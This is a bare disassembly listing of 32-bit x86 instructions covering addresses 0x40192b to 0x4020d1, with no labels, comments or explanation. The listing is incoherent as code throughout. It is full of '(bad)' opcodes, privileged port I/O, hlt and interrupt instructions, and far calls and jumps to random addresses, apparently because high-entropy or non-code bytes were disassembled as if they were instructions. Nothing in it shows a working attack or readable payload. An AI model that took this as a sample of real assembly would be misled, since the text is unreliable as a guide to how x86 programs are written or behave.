  40192b:	stos   BYTE PTR es:[edi],al
  40192c:	(bad)  [esi-0x14]
  40192f:	pop    esi
  401930:	push   eax
  401931:	(bad)  
  401932:	sub    ecx,DWORD PTR [esi]
  401934:	and    al,BYTE PTR [ebp-0x5a]
  401937:	inc    eax
  401938:	jmp    0xee812a27
  40193d:	adc    eax,0xebabca20
  401942:	lods   eax,DWORD PTR ds:[esi]
  401943:	imul   ebp,DWORD PTR [edi+ecx*2-0x1ac5c8cb],0xffffffd7
  40194b:	push   0x9fb576ac
  401950:	xor    eax,0x857a878c
  401955:	adc    ah,ah
  401957:	imul   edx,DWORD PTR [ebx-0x2c0ec013],0xffffff8a
  40195e:	cli    
  40195f:	ret    0x8eec
  401962:	loope  0x401985
  401964:	mov    ah,0xc6
  401966:	or     al,0xa7
  401969:	sub    BYTE PTR [ebx+0x5c],ch
  40196c:	pop    edi
  40196d:	(bad)  [ecx-0x10]
  401970:	(bad)  
  401971:	push   ebp
  401972:	cmp    BYTE PTR [eax-0x4be9c240],dh
  401978:	sub    eax,0x191156f7
  40197d:	cmc    
  40197e:	jbe    0x4019e1
  401980:	(bad)  
  401981:	lahf   
  401982:	add    eax,0xa29aa1cd
  401987:	das    
  401988:	int    0xb5
  40198a:	sbb    ecx,DWORD PTR [ebx+0x11]
  40198d:	sar    DWORD PTR [esi],cl
  40198f:	sbb    dh,BYTE PTR [edx+0x8]
  401992:	jne    0x40194e
  401994:	dec    edx
  401995:	das    
  401996:	hlt    
  401997:	adc    ah,ah
  401999:	loope  0x401a0e
  40199b:	dec    esp
  40199c:	sub    eax,0xe1ab05db
  4019a1:	sahf   
  4019a2:	lods   eax,DWORD PTR ds:[esi]
  4019a3:	sub    eax,0xc3f4c8e3
  4019a8:	jns    0x40193b
  4019aa:	inc    esi
  4019ab:	mov    BYTE PTR [eax+0x777460df],bh
  4019b1:	gs popf 
  4019b3:	test   eax,0xa07d04e7
  4019b8:	mov    ds:0xaa3e0dfc,eax
  4019bd:	jb     0x4019e9
  4019bf:	fwait
  4019c0:	es ja  0x4019af
  4019c3:	sbb    edx,esp
  4019c5:	jno    0x401984
  4019c7:	mov    WORD PTR [ecx+ebp*2-0x46977dfb],ds
  4019ce:	aaa    
  4019cf:	mov    ebx,0x9a67d42b
  4019d4:	sbb    al,0x17
  4019d6:	add    BYTE PTR [ecx],0x61
  4019d9:	aas    
  4019da:	jnp    0x4019e8
  4019dc:	rcr    DWORD PTR [eax+0x7794b9f8],cl
  4019e2:	shr    esp,cl
  4019e4:	inc    ecx
  4019e5:	xchg   DWORD PTR [ecx+eiz*8-0x191e89fa],edi
  4019ec:	jmp    0xac52ccb9
  4019f1:	mov    gs,WORD PTR [edx]
  4019f3:	cmp    DWORD PTR [ebp-0x1237e9d6],esp
  4019f9:	fiadd  WORD PTR [edi+0x52]
  4019fc:	xchg   ecx,eax
  4019fd:	rol    BYTE PTR [esi-0x3e],cl
  401a00:	neg    BYTE PTR [esi+ebx*4+0x37]
  401a04:	push   ss
  401a05:	sub    al,0xf2
  401a07:	adc    al,0x2e
  401a09:	fcom   QWORD PTR [edi+edi*1+0x2d7f78bd]
  401a10:	xchg   ebx,eax
  401a11:	(bad)  
  401a12:	fisub  DWORD PTR [esi+0x3d]
  401a15:	in     eax,dx
  401a16:	mov    dh,0x31
  401a18:	mov    al,bl
  401a1a:	pop    es
  401a1b:	push   0x3b0c7d57
  401a20:	push   esi
  401a21:	jns    0x401a48
  401a23:	inc    ebp
  401a24:	dec    esp
  401a25:	enter  0x5789,0x74
  401a29:	xor    DWORD PTR [edx+0x3d],esi
  401a2c:	gs ins BYTE PTR es:[edi],dx
  401a2e:	or     bl,dl
  401a30:	push   es
  401a31:	inc    ecx
  401a32:	mov    ecx,0xfdfa28f5
  401a37:	pop    ss
  401a38:	mov    fs,WORD PTR [edx-0x2a]
  401a3b:	jmp    0x4c73da19
  401a40:	iret   
  401a41:	xchg   edx,eax
  401a42:	or     bl,BYTE PTR [edx]
  401a44:	lahf   
  401a45:	icebp  
  401a46:	or     BYTE PTR [ecx-0x6cf3b4e5],0x43
  401a4d:	sub    ebx,DWORD PTR [ebx+0x28b25715]
  401a53:	(bad)  
  401a54:	call   0x52e4:0x903371e1
  401a5b:	and    ah,dl
  401a5d:	mov    cl,0xaf
  401a5f:	ins    BYTE PTR es:[edi],dx
  401a60:	inc    edx
  401a61:	xchg   esp,eax
  401a62:	fdiv   DWORD PTR [ecx]
  401a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a67:	call   0xee17:0xe928c1d8
  401a6e:	or     eax,DWORD PTR [ebp-0x5e]
  401a71:	mov    edx,0x5c48ba3
  401a76:	push   ebp
  401a77:	and    eax,0x73bfd4f4
  401a7c:	pop    esp
  401a7d:	add    ecx,DWORD PTR [ebx]
  401a7f:	aas    
  401a80:	sub    cl,BYTE PTR [edi-0x155d65bf]
  401a86:	push   ebx
  401a87:	inc    eax
  401a88:	jl     0x401a36
  401a8a:	inc    edx
  401a8b:	sub    al,0x41
  401a8d:	xchg   esp,eax
  401a8e:	add    DWORD PTR [ebp+0x245e590],edi
  401a94:	dec    eax
  401a95:	dec    bl
  401a97:	ds stc 
  401a99:	sub    eax,0x2055efce
  401a9e:	dec    eax
  401a9f:	inc    ebp
  401aa0:	sbb    esp,DWORD PTR [edx+0x44]
  401aa3:	jb     0x401a45
  401aa5:	lds    ebx,FWORD PTR [ebx+0x3f]
  401aa8:	sbb    ebp,DWORD PTR [ebx+eiz*8]
  401aab:	jg     0x401b29
  401aad:	or     BYTE PTR [edi+edx*1],al
  401ab0:	sbb    BYTE PTR es:[esi+0x22],dh
  401ab4:	fldcw  WORD PTR ds:0xc06cc567
  401aba:	or     al,0x7c
  401abc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401abd:	xchg   ecx,eax
  401abe:	xchg   ebx,eax
  401abf:	das    
  401ac0:	in     al,dx
  401ac1:	imul   edx,DWORD PTR [esi+0x14],0x1
  401ac5:	out    dx,eax
  401ac6:	inc    DWORD PTR fs:[ebp-0x4ed9a3d5]
  401acd:	mov    esp,0x9e7c953e
  401ad2:	nop
  401ad3:	pop    esp
  401ad4:	inc    eax
  401ad5:	out    dx,eax
  401ad6:	lods   eax,DWORD PTR ds:[esi]
  401ad7:	xlat   BYTE PTR ds:[ebx]
  401ad8:	mov    edi,0xacf009c6
  401add:	mov    ds,WORD PTR [edx-0x1416679f]
  401ae3:	clc    
  401ae4:	xchg   DWORD PTR [ebx-0x19e286f2],ecx
  401aea:	int    0x68
  401aec:	cmp    ch,dh
  401aee:	jns    0x401ab5
  401af0:	cmp    eax,0xf5234102
  401af5:	test   eax,0x81a65d7e
  401afa:	jnp    0x401abe
  401afc:	ds ins BYTE PTR es:[edi],dx
  401afe:	iret   
  401aff:	push   ss
  401b00:	inc    esp
  401b01:	push   0x918e0884
  401b06:	inc    eax
  401b07:	cmp    DWORD PTR [eax+ecx*2],esi
  401b0a:	mov    bh,al
  401b0c:	idiv   DWORD PTR [edi-0x47]
  401b0f:	mov    al,0x64
  401b11:	jo     0x401ac9
  401b13:	enter  0x8429,0x20
  401b17:	stos   BYTE PTR es:[edi],al
  401b18:	enter  0x87e8,0x61
  401b1c:	or     BYTE PTR [ecx+ebx*4],ah
  401b1f:	sbb    DWORD PTR [edx-0x9],ebx
  401b22:	xor    BYTE PTR [edx+0x66f343f],al
  401b28:	jl     0x401b8b
  401b2a:	cmp    ecx,DWORD PTR [eax+eax*1+0x3f]
  401b2e:	and    eax,0x2466c672
  401b33:	sub    eax,0xac400866
  401b38:	mov    edx,0x320bed6b
  401b3d:	dec    ecx
  401b3e:	xchg   ebp,eax
  401b3f:	mov    WORD PTR [esi+0x360a5f31],es
  401b45:	jl     0x401af6
  401b47:	jle    0x401b48
  401b49:	js     0x401b5f
  401b4b:	icebp  
  401b4c:	inc    ebp
  401b4d:	aas    
  401b4e:	push   0xfffffffa
  401b50:	mov    WORD PTR [eax+0x73668df9],ss
  401b56:	and    eax,0xdd884105
  401b5b:	(bad)
  401b5f:	xchg   BYTE PTR [edx],cl
  401b61:	call   0x9d95abba
  401b66:	in     eax,0xac
  401b68:	dec    edx
  401b69:	jp     0x401b27
  401b6b:	fcomp  st(1)
  401b6d:	lods   al,BYTE PTR ds:[esi]
  401b6e:	dec    edi
  401b6f:	mov    eax,cs:0xd7664a17
  401b75:	popa   
  401b76:	jl     0x401ba3
  401b78:	xchg   ebp,eax
  401b79:	sub    bl,BYTE PTR [ecx+0x56c8da0f]
  401b7f:	test   eax,0x9eac54fa
  401b84:	mov    ecx,0x6105bb08
  401b89:	xor    BYTE PTR [edx],bl
  401b8b:	inc    edx
  401b8c:	and    al,0x1
  401b8e:	pop    eax
  401b8f:	loopne 0x401bc2
  401b91:	fisttp WORD PTR [ebx-0x36]
  401b94:	(bad)  
  401b95:	fs push ecx
  401b97:	pop    edx
  401b98:	jp     0x401b1e
  401b9a:	add    bh,BYTE PTR [eax-0x6b]
  401b9d:	jle    0x401beb
  401b9f:	cmp    eax,0x2cd760dc
  401ba4:	leave  
  401ba5:	xor    BYTE PTR [edi-0x50686c43],0x7f
  401bac:	jnp    0x401b7b
  401bae:	mov    eax,ds:0x61fb8c9b
  401bb3:	pop    edi
  401bb4:	mov    ebx,0xbfd918c7
  401bb9:	xlat   BYTE PTR ds:[ebx]
  401bba:	dec    eax
  401bbb:	cs ins DWORD PTR es:[edi],dx
  401bbd:	or     ebx,DWORD PTR [ebx+eax*8-0x44]
  401bc1:	popf   
  401bc2:	and    DWORD PTR [eax+0x5bc2c09],esp
  401bc8:	dec    BYTE PTR [ecx]
  401bca:	dec    ebx
  401bcb:	jle    0x401b75
  401bcd:	push   ss
  401bce:	push   edi
  401bcf:	out    0x9e,al
  401bd1:	inc    esp
  401bd2:	add    edx,edx
  401bd4:	mov    DWORD PTR [ebp+edx*4+0x3a],edx
  401bd8:	lods   eax,DWORD PTR ds:[esi]
  401bd9:	and    DWORD PTR [ebp+0x55],esi
  401bdc:	pop    esi
  401bdd:	and    eax,DWORD PTR [eax-0x73]
  401be0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401be1:	stos   BYTE PTR es:[edi],al
  401be2:	or     DWORD PTR ds:0xf8334ff4,ebx
  401be8:	push   ebp
  401be9:	test   BYTE PTR ds:0x3526aa77,ch
  401bef:	mov    BYTE PTR [ebx-0x2e],ah
  401bf2:	inc    edx
  401bf3:	mov    al,ds:0x66fa37cf
  401bf8:	sbb    edi,DWORD PTR [ebx+0x35]
  401bfb:	mov    cl,0xbe
  401bfd:	jnp    0x401c6b
  401bff:	cld    
  401c00:	ret    0x69e0
  401c03:	into   
  401c04:	imul   eax,DWORD PTR [edx-0x125fd4d2],0xdfc95991
  401c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c0f:	out    0x9d,al
  401c11:	sbb    BYTE PTR [edx+0x5b390c4b],cl
  401c17:	call   DWORD PTR [edi+0x44be9c97]
  401c1d:	cmp    BYTE PTR [ebx+0x11],cl
  401c20:	mov    ah,0xb5
  401c22:	dec    edx
  401c23:	nop
  401c24:	leave  
  401c25:	jl     0x401c28
  401c27:	xchg   esi,eax
  401c28:	shl    DWORD PTR ds:0x140e50dc,1
  401c2e:	les    ebp,FWORD PTR [esi+0x21]
  401c31:	and    esp,0x9bc0497b
  401c37:	and    bl,bl
  401c39:	fdivr  QWORD PTR [edi+0x37]
  401c3c:	mov    ecx,0x719352af
  401c41:	scas   al,BYTE PTR es:[edi]
  401c42:	mov    esp,0x34396667
  401c47:	xlat   BYTE PTR ds:[ebx]
  401c48:	jae    0x401cad
  401c4a:	icebp  
  401c4b:	inc    edi
  401c4c:	adc    DWORD PTR [esi-0x508700eb],esp
  401c52:	int    0x5c
  401c54:	xchg   edi,eax
  401c55:	push   esi
  401c56:	pop    edx
  401c57:	push   ebp
  401c58:	xchg   BYTE PTR [esp+ebx*1+0x5bc6a7bb],dh
  401c5f:	jmp    0x9534bc0a
  401c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c65:	push   0x52e9bfcd
  401c6a:	push   esi
  401c6b:	xchg   ebp,eax
  401c6c:	inc    ebx
  401c6d:	into   
  401c6e:	sbb    DWORD PTR [edi-0x54],ebp
  401c71:	and    eax,0xfa4c4018
  401c76:	into   
  401c77:	mov    edi,0x1473939d
  401c7c:	xor    DWORD PTR [edx-0x9],eax
  401c7f:	xchg   ebp,eax
  401c80:	mov    dh,0xb9
  401c82:	ins    DWORD PTR es:[edi],dx
  401c83:	ins    BYTE PTR es:[edi],dx
  401c84:	iret   
  401c85:	mov    esp,DWORD PTR [ecx+0x218ad108]
  401c8b:	lea    ebx,[eax]
  401c8d:	add    BYTE PTR [ecx-0x1e9a5fee],dh
  401c93:	call   FWORD PTR [ebx+edi*2+0x70960765]
  401c9a:	jp     0x401c38
  401c9c:	pop    ebx
  401c9d:	sbb    al,0xaa
  401c9f:	fidiv  DWORD PTR [ecx]
  401ca1:	(bad)  
  401ca3:	pop    eax
  401ca4:	cdq    
  401ca5:	inc    ecx
  401ca6:	adc    eax,edx
  401ca8:	push   ss
  401ca9:	push   ds
  401caa:	jno    0x401c8d
  401cac:	fwait
  401cad:	jns    0x401c43
  401caf:	hlt    
  401cb0:	push   esi
  401cb1:	mov    BYTE PTR [ebx-0x23128f15],bh
  401cb7:	fld    TBYTE PTR [eax+0xa]
  401cba:	pop    edx
  401cbb:	(bad)  
  401cbc:	fistp  QWORD PTR [eax-0x7a]
  401cbf:	push   es
  401cc0:	in     eax,0x24
  401cc2:	pop    ebx
  401cc3:	add    eax,0xaa8b7e97
  401cc8:	jle    0x401c5e
  401cca:	gs das 
  401ccc:	sahf   
  401ccd:	mov    edi,0x82157d4e
  401cd2:	xchg   cl,bl
  401cd4:	ins    BYTE PTR es:[edi],dx
  401cd5:	pop    eax
  401cd6:	push   ecx
  401cd7:	xchg   ecx,edi
  401cd9:	fisttp WORD PTR [edi]
  401cdb:	mov    ch,0x16
  401cdd:	xor    ah,BYTE PTR [ecx]
  401cdf:	pop    ebp
  401ce0:	jbe    0x39f0aaf6
  401ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ce7:	cld    
  401ce8:	add    eax,0xce1d9018
  401ced:	cmp    esi,ecx
  401cef:	outs   dx,BYTE PTR ds:[esi]
  401cf0:	sbb    eax,edx
  401cf2:	lods   al,BYTE PTR ds:[esi]
  401cf3:	xor    eax,0xd3b6eda1
  401cf8:	jae    0x401d6d
  401cfa:	push   esp
  401cfb:	pop    ds
  401cfc:	push   0x1c
  401cfe:	jne    0x401cbc
  401d00:	inc    eax
  401d01:	pop    ds
  401d02:	fbld   TBYTE PTR [ecx-0x39]
  401d05:	add    al,0x8a
  401d07:	data16 xor BYTE PTR [edi*1+0x51626488],ch
  401d0f:	dec    ebp
  401d10:	push   ebx
  401d11:	mov    bl,0xa8
  401d13:	jbe    0x401d7f
  401d15:	hlt    
  401d16:	loope  0x401d50
  401d18:	add    BYTE PTR [edi+0x28],bh
  401d1b:	sub    DWORD PTR [esi+eax*1],ebp
  401d1e:	sti    
  401d1f:	mov    edi,0xa9d09bc8
  401d24:	mov    ah,0x51
  401d26:	dec    ebx
  401d27:	fimul  WORD PTR [edx-0x8a384f2]
  401d2d:	lea    esp,[edi]
  401d2f:	test   eax,0x7e0e9e30
  401d34:	test   DWORD PTR [eax-0x22],edx
  401d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d38:	xchg   DWORD PTR [ebx-0x2e],ebp
  401d3b:	mov    edx,0x833ea157
  401d40:	xor    al,0x6d
  401d42:	jno    0x401d65
  401d44:	or     ebp,ecx
  401d46:	adc    ah,BYTE PTR [ecx-0x4fea5671]
  401d4c:	int    0x9f
  401d4e:	nop
  401d4f:	outs   dx,DWORD PTR ds:[esi]
  401d50:	addr16 mov dh,0xd1
  401d53:	pop    ebp
  401d54:	loope  0x401d41
  401d56:	retf   
  401d57:	inc    eax
  401d58:	sbb    DWORD PTR [ecx],edi
  401d5a:	daa    
  401d5b:	jo     0x401d1c
  401d5d:	loope  0x401cf8
  401d5f:	(bad)  
  401d61:	aaa    
  401d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d63:	add    dl,bh
  401d65:	xchg   ecx,eax
  401d66:	fwait
  401d67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d68:	loope  0x401d94
  401d6a:	cwde   
  401d6b:	loope  0x401d90
  401d6d:	loope  0x401d2a
  401d6f:	dec    edi
  401d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d71:	mov    esp,0x6c34f288
  401d76:	dec    esi
  401d77:	add    dl,BYTE PTR [esi]
  401d79:	sbb    esp,DWORD PTR [edi]
  401d7b:	fmul   DWORD PTR ss:[eax+0x48accaab]
  401d82:	mov    dl,0xe4
  401d84:	dec    ebp
  401d85:	xchg   ebx,eax
  401d86:	ret    
  401d87:	lods   al,BYTE PTR ds:[esi]
  401d88:	or     DWORD PTR [ebx],0x9663d6e9
  401d8e:	inc    ecx
  401d8f:	call   0xe11b7abf
  401d94:	or     eax,0xc4dfb5ae
  401d99:	mov    al,0x94
  401d9b:	mov    edx,0x69457fe8
  401da0:	jecxz  0x401e17
  401da2:	adc    ecx,DWORD PTR [eax+0x46]
  401da5:	add    BYTE PTR [ecx+ebp*4+0x23],0x1d
  401daa:	test   al,0x95
  401dad:	imul   esp,DWORD PTR ds:0xe0c5f38,0x22
  401db4:	mov    dh,0x7a
  401db6:	jns    0x401d4d
  401db8:	sbb    al,0x24
  401dba:	cwde   
  401dbb:	sub    eax,esp
  401dbd:	add    edx,edx
  401dbf:	sbb    BYTE PTR [eax-0x6b],bl
  401dc2:	sar    BYTE PTR [bx+di],0x6b
  401dc6:	pop    esp
  401dc7:	call   0x3dae47fc
  401dcc:	adc    BYTE PTR [ecx],ah
  401dce:	sbb    eax,ebp
  401dd0:	mov    DWORD PTR [ecx+0x263088e],edx
  401dd6:	or     DWORD PTR [edx],0xffffffb9
  401dd9:	mov    bl,BYTE PTR [ebx+eiz*2]
  401ddc:	stos   BYTE PTR es:[edi],al
  401ddd:	mov    bl,0xfa
  401ddf:	out    0x86,al
  401de1:	mov    ebp,0xf7f79abe
  401de6:	call   0x78cc:0xa8179aac
  401ded:	push   cs
  401dee:	and    ch,cl
  401df0:	jmp    0x15176818
  401df5:	mov    DWORD PTR [ebp-0x6a055ccb],0xee484e47
  401dff:	shl    BYTE PTR [ecx+0x70],0xee
  401e03:	xchg   ecx,eax
  401e04:	call   0xfb3a:0x5360e664
  401e0b:	mov    es,WORD PTR [eax+0x43bcbade]
  401e11:	mov    ds:0x7947e959,al
  401e16:	dec    edi
  401e17:	inc    ebx
  401e18:	adc    BYTE PTR [edx],ch
  401e1a:	popf   
  401e1b:	fimul  DWORD PTR [ebx]
  401e1d:	pop    ecx
  401e1e:	pop    es
  401e1f:	fcomp  DWORD PTR [ebx-0x6f9508b]
  401e25:	push   ss
  401e26:	pop    esp
  401e27:	jg     0x401e3f
  401e29:	push   eax
  401e2a:	out    0xe3,al
  401e2c:	mov    DWORD PTR ds:0xfb52af89,ebx
  401e32:	mov    bh,0x3
  401e34:	loop   0x401dfe
  401e36:	icebp  
  401e37:	add    esi,DWORD PTR [edi-0x3212f6d4]
  401e3d:	rcl    BYTE PTR [ecx+0x7d],1
  401e40:	pop    ds
  401e41:	test   BYTE PTR [edi],ch
  401e43:	adc    eax,0xb8d8e799
  401e48:	sub    DWORD PTR [ecx+0x5a],edi
  401e4b:	ret    0xb451
  401e4e:	mov    esp,0xd8ee7288
  401e53:	out    0x93,eax
  401e55:	xchg   ah,bh
  401e57:	sub    eax,edx
  401e59:	dec    ebp
  401e5a:	push   edi
  401e5b:	push   cs
  401e5c:	sub    al,0x22
  401e5e:	cmp    al,0x25
  401e60:	add    eax,0x9c303049
  401e65:	bound  ecx,QWORD PTR [edi+edi*4]
  401e68:	outs   dx,BYTE PTR ds:[esi]
  401e69:	or     eax,0xfbbf811e
  401e6e:	xor    DWORD PTR [eax],esp
  401e70:	or     dl,BYTE PTR [esi]
  401e72:	sub    ebx,DWORD PTR [eax+0x10d15260]
  401e78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e79:	adc    BYTE PTR [edi-0x26c528b0],cl
  401e7f:	imul   eax,DWORD PTR [ecx+0x66],0xff0346ec
  401e86:	inc    ebx
  401e87:	inc    ebx
  401e88:	jmp    0x401ec4
  401e8a:	xchg   edi,eax
  401e8b:	ins    BYTE PTR es:[edi],dx
  401e8c:	popa   
  401e8d:	packuswb mm0,mm6
  401e90:	add    ch,BYTE PTR [ebx+0x6d85ac05]
  401e96:	xchg   edi,eax
  401e97:	dec    esi
  401e98:	adc    DWORD PTR [edx],ecx
  401e9a:	pop    edx
  401e9b:	inc    ecx
  401e9c:	jo     0x401ed8
  401e9e:	pop    ecx
  401e9f:	inc    edi
  401ea0:	xor    al,0x25
  401ea2:	add    dh,bl
  401ea4:	leave  
  401ea5:	adc    al,0x1a
  401ea7:	mov    bl,0xe0
  401ea9:	xrelease mov BYTE PTR [ebp-0x11],bh
  401ead:	mov    eax,0xf407fcb9
  401eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eb3:	xchg   BYTE PTR [edi],cl
  401eb5:	fcomp  QWORD PTR [ebx]
  401eb7:	push   ebp
  401eb8:	out    0x97,eax
  401eba:	xchg   edi,eax
  401ebb:	mov    ecx,0x93529b85
  401ec0:	inc    BYTE PTR [edi]
  401ec2:	sub    DWORD PTR [ebp+0x3950e80b],ebx
  401ec8:	push   0xebe7260f
  401ecd:	ret    0x4a8c
  401ed0:	ja     0x401ed8
  401ed2:	xchg   ebp,eax
  401ed3:	scas   eax,DWORD PTR es:[edi]
  401ed4:	das    
  401ed5:	sbb    ah,BYTE PTR [edx-0x71]
  401ed8:	adc    al,dl
  401eda:	les    edi,FWORD PTR [esi-0x47]
  401edd:	add    esi,ebp
  401edf:	cmp    DWORD PTR cs:[edx+0x557df676],ebp
  401ee6:	ja     0x401ea0
  401ee8:	das    
  401ee9:	pop    ebx
  401eea:	xor    al,0x49
  401eec:	xor    al,0x49
  401eee:	xlat   BYTE PTR fs:[ebx]
  401ef0:	sahf   
  401ef1:	cwde   
  401ef2:	arpl   WORD PTR [ebp+ebp*8+0x623309f3],si
  401ef9:	in     eax,0x7b
  401efb:	sub    eax,DWORD PTR [esi-0x26]
  401efe:	cmp    ebp,ebp
  401f00:	mov    eax,0x82d5e0d4
  401f05:	ret    0x6530
  401f08:	xor    esi,eax
  401f0a:	jb     0x401f27
  401f0c:	add    eax,0x658646f1
  401f11:	mov    ecx,0xb934830a
  401f16:	mov    esp,0xb8168e41
  401f1b:	xor    edx,DWORD PTR [edi+ecx*8]
  401f1e:	cmp    al,0xd
  401f20:	(bad)  
  401f21:	mov    ah,0x77
  401f23:	and    DWORD PTR [esp+eiz*4-0x40c96a42],0xffffffc1
  401f2b:	dec    ebx
  401f2c:	xchg   ebx,eax
  401f2d:	ret    0x60cb
  401f30:	jns    0x401f2a
  401f32:	scas   al,BYTE PTR es:[edi]
  401f33:	ins    DWORD PTR es:[edi],dx
  401f34:	lock or bl,bl
  401f37:	addr16 aas 
  401f39:	xchg   ebx,eax
  401f3a:	loopne 0x401f0a
  401f3c:	adc    eax,esp
  401f3e:	in     al,0x8d
  401f40:	(bad)
  401f43:	sbb    eax,0xfe9cbf3f
  401f48:	mov    BYTE PTR [edi+ebp*8],dh
  401f4b:	lods   eax,DWORD PTR ds:[esi]
  401f4c:	gs mul ebp
  401f4f:	sbb    eax,0x14b3d8c3
  401f54:	inc    edx
  401f55:	jmp    0x8002d8cc
  401f5a:	shr    ah,1
  401f5c:	ret    0xb8a8
  401f5f:	sbb    DWORD PTR [esi],ebx
  401f61:	aam    0xd5
  401f63:	cwde   
  401f64:	and    edx,DWORD PTR [esi]
  401f66:	ret    0xfa92
  401f69:	int    0x4c
  401f6b:	mov    esp,0xcb6d4236
  401f70:	add    DWORD PTR [edi+0x387005de],ecx
  401f76:	test   eax,0x806d4352
  401f7b:	or     BYTE PTR [ecx-0x87a1c96],bl
  401f81:	ins    DWORD PTR es:[edi],dx
  401f82:	mov    WORD PTR [esi+0x3f],cs
  401f85:	cmp    bh,BYTE PTR [esp+esi*4+0x1]
  401f89:	lods   eax,DWORD PTR ds:[esi]
  401f8a:	enter  0x884d,0x75
  401f8e:	cmpxchg BYTE PTR [esi+0x76543ab4],dh
  401f95:	stc    
  401f96:	jnp    0x6bb7eb27
  401f9c:	in     eax,0xb2
  401f9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f9f:	int3   
  401fa0:	popa   
  401fa1:	add    ah,ah
  401fa3:	es push ecx
  401fa5:	pop    ecx
  401fa6:	cs pop esi
  401fa8:	and    al,0x7f
  401faa:	pop    ebx
  401fab:	out    dx,eax
  401fac:	inc    ebx
  401fad:	push   ds
  401fae:	push   0x14
  401fb0:	test   al,0xf2
  401fb2:	dec    ecx
  401fb3:	pop    ss
  401fb4:	sbb    al,0x54
  401fb6:	push   edi
  401fb7:	ins    BYTE PTR es:[edi],dx
  401fb8:	outs   dx,DWORD PTR cs:[esi]
  401fba:	inc    esp
  401fbb:	enter  0xdb12,0x6b
  401fbf:	scas   eax,DWORD PTR es:[edi]
  401fc0:	or     edi,DWORD PTR [ebp-0x9]
  401fc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fc5:	pop    ebx
  401fc7:	adc    DWORD PTR ds:0x42805906,eax
  401fcd:	jne    0x402017
  401fcf:	adc    BYTE PTR [edx-0x21],ah
  401fd2:	rcr    DWORD PTR [eax],cl
  401fd4:	dec    ebp
  401fd5:	ficom  WORD PTR [edi+ecx*2]
  401fd8:	jp     0x401ff9
  401fda:	lds    edx,FWORD PTR [ecx+0x46]
  401fdd:	mov    eax,0x654ac21b
  401fe2:	mov    bl,0x46
  401fe4:	(bad)  
  401fe5:	aam    0xd6
  401fe7:	stos   DWORD PTR es:[edi],eax
  401fe8:	jbe    0x40202f
  401fea:	dec    edi
  401feb:	inc    ebx
  401fec:	pushf  
  401fed:	cwde   
  401fee:	mov    esi,0x7dd4f9b1
  401ff3:	pusha  
  401ff4:	jle    0x401ff4
  401ff6:	mov    edi,0x8b6b0d8
  401ffb:	or     DWORD PTR [ebx+0x28],esp
  401ffe:	push   0xffffff99
  402000:	ins    BYTE PTR es:[edi],dx
  402001:	xor    eax,0xac1c880a
  402006:	sbb    dh,BYTE PTR [edx]
  402008:	xchg   BYTE PTR [esi+0x59],ch
  40200b:	hlt    
  40200c:	clc    
  40200d:	test   eax,0xf6541f31
  402012:	adc    eax,0xbf718cf6
  402017:	ds leave 
  402019:	sub    eax,ebp
  40201b:	hlt    
  40201c:	daa    
  40201d:	retf   0xd175
  402020:	cmc    
  402021:	sub    BYTE PTR [ecx+0x59299806],al
  402027:	sbb    eax,0x1a8b83bc
  40202c:	sub    esp,DWORD PTR [edi+0x3d]
  40202f:	jnp    0x40209a
  402031:	pop    ecx
  402032:	cmp    BYTE PTR [eax-0x49],bh
  402035:	daa    
  402036:	es js  0x40206e
  402039:	fs mov edi,0xd5ce2f9b
  40203f:	sbb    eax,0xfd465e58
  402044:	add    eax,0x86d06937
  402049:	out    dx,eax
  40204a:	pop    ss
  40204b:	sub    ebx,DWORD PTR [edx-0x75]
  40204e:	es mov al,0xb1
  402051:	outs   dx,BYTE PTR ds:[esi]
  402052:	ins    BYTE PTR es:[edi],dx
  402053:	nop
  402054:	loope  0x40205f
  402056:	and    eax,0x15818e89
  40205b:	mov    ds:0xb0d84a71,eax
  402060:	or     DWORD PTR [esi-0x22],esi
  402063:	pop    edi
  402064:	jne    0x402022
  402066:	mov    eax,0x497cf01a
  40206b:	shr    BYTE PTR [edx+0x69],1
  40206e:	repnz dec esp
  402070:	iret   
  402071:	xor    edi,DWORD PTR [ebx+ecx*2-0x63]
  402075:	pop    edi
  402076:	pusha  
  402077:	lods   eax,DWORD PTR ds:[esi]
  402078:	mov    dl,0x63
  40207a:	out    0xe2,eax
  40207c:	das    
  40207d:	pop    edi
  40207e:	or     BYTE PTR [edi],cl
  402080:	in     al,dx
  402081:	push   ebx
  402082:	and    eax,ebp
  402084:	adc    al,0x18
  402086:	mov    bl,BYTE PTR [ebp-0x60]
  402089:	xor    ch,BYTE PTR [ecx+0x67]
  40208c:	push   cs
  40208d:	jne    0x402083
  40208f:	and    eax,0xa82a7082
  402094:	sbb    cl,BYTE PTR [edi+0x630ab4a1]
  40209a:	fisttp WORD PTR cs:[esi-0x2e1cfe43]
  4020a1:	pop    ss
  4020a2:	xor    BYTE PTR [ebp+0x15],dl
  4020a5:	add    cl,BYTE PTR [ecx-0x46]
  4020a8:	pop    ds
  4020a9:	mov    cl,0xa2
  4020ab:	cld    
  4020ac:	jbe    0x4020b3
  4020ae:	jmp    0x40209b
  4020b0:	inc    esp
  4020b1:	mov    ebx,0xd9752f6
  4020b6:	dec    esi
  4020b7:	mov    BYTE PTR [ebx-0x3c],ch
  4020ba:	(bad)  
  4020bb:	ror    DWORD PTR ds:0x17e618c7,cl
  4020c1:	(bad)  
  4020c4:	out    0x2e,eax
  4020c6:	cmp    al,0x76
  4020c8:	mov    esi,DWORD PTR [ebp+0x5538a146]
  4020ce:	aam    0xd0
  4020d0:	scas   eax,DWORD PTR es:[edi]
  4020d1:	sub    DWORD PTR [edi+0x1034ab8f],edi
